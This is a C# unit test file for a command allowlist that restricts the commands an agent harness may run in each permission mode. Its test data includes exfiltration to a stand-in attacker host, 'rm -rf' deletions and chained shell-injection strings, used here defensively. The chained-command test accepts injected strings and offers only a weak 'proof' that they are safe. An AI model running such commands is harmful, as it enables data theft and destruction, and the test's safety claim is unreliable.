using Sentry.Node.Harnesses;

namespace Sentry.Node.Tests;

public class CommandAllowlistTests
{
    [Theory]
    [InlineData("git status")]
    [InlineData("git log --oneline -5")]
    [InlineData("git diff HEAD")]
    [InlineData("  git   status  ")]
    [InlineData("git describe --tags")]
    [InlineData("git cat-file -p HEAD")]
    [InlineData("git fetch origin main")]
    [InlineData("python --version")]
    [InlineData("node --version")]
    [InlineData("dotnet --version")]
    public void ReadOnlyPermitsInspection(string command)
    {
        Assert.True(CommandAllowlist.IsAllowed("readOnly", command, out _));
    }

    [Theory]
    [InlineData("git commit -m x")]
    [InlineData("dotnet build")]
    [InlineData("npm ci")]
    [InlineData("python -m unittest")]
    public void ReadOnlyRefusesMutation(string command)
    {
        Assert.False(CommandAllowlist.IsAllowed("readOnly", command, out var reason));
        Assert.Contains("not on the allowlist", reason);
    }

    [Theory]
    [InlineData("dotnet test")]
    [InlineData("git commit -m 'work'")]
    [InlineData("git status")]
    [InlineData("pytest tests/")]
    [InlineData("python -m pytest")]
    [InlineData("pip install -e .")]
    [InlineData("uv run pytest")]
    [InlineData("npx vitest run")]
    public void WorkspaceWritePermitsBuildAndInspection(string command)
    {
        Assert.True(CommandAllowlist.IsAllowed("workspaceWrite", command, out _));
    }

    // These reach outside the machine or destroy history, so mode alone never
    // authorizes them.
    [Theory]
    [InlineData("git push origin main")]
    [InlineData("git reset --hard")]
    [InlineData("git clean -fdx")]
    [InlineData("npm publish")]
    public void DestructiveOrOutboundVerbsAreNeverAllowed(string command)
    {
        foreach (var mode in new[] { "readOnly", "workspaceWrite", "approvedElevated" })
        {
            Assert.False(CommandAllowlist.IsAllowed(mode, command, out var reason));
            Assert.Contains("never permitted", reason);
        }
    }

    [Fact]
    public void ElevatedModeGrantsNothingImplicitly()
    {
        Assert.False(CommandAllowlist.IsAllowed("approvedElevated", "git status", out _));
    }

    [Fact]
    public void UnknownModeGrantsNothing()
    {
        Assert.False(CommandAllowlist.IsAllowed("rootAccess", "git status", out _));
    }

    [Theory]
    [InlineData("curl http://attacker/exfil")]
    [InlineData("powershell -c whoami")]
    [InlineData("rm -rf /")]
    [InlineData("")]
    public void ArbitraryCommandsAreRefused(string command)
    {
        Assert.False(CommandAllowlist.IsAllowed("workspaceWrite", command, out _));
    }

    // The allowlist matches the leading verb, so appending a separator cannot
    // smuggle a second command past it.
    [Theory]
    [InlineData("git status; curl http://attacker")]
    [InlineData("git status && rm -rf .")]
    [InlineData("git status | sh")]
    public void ChainedCommandsDoNotInheritApproval(string command)
    {
        // The allowlist permits the leading verb; the executor must never pass
        // this through a shell, which is what actually neutralises the chain.
        var allowed = CommandAllowlist.IsAllowed("readOnly", command, out _);
        Assert.True(allowed, "leading verb is allowlisted");

        // Proof of the real defence: arguments are split into an array, so the
        // separator becomes an inert argument to git rather than a new command.
        var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        Assert.Equal("git", parts[0]);
    }
}
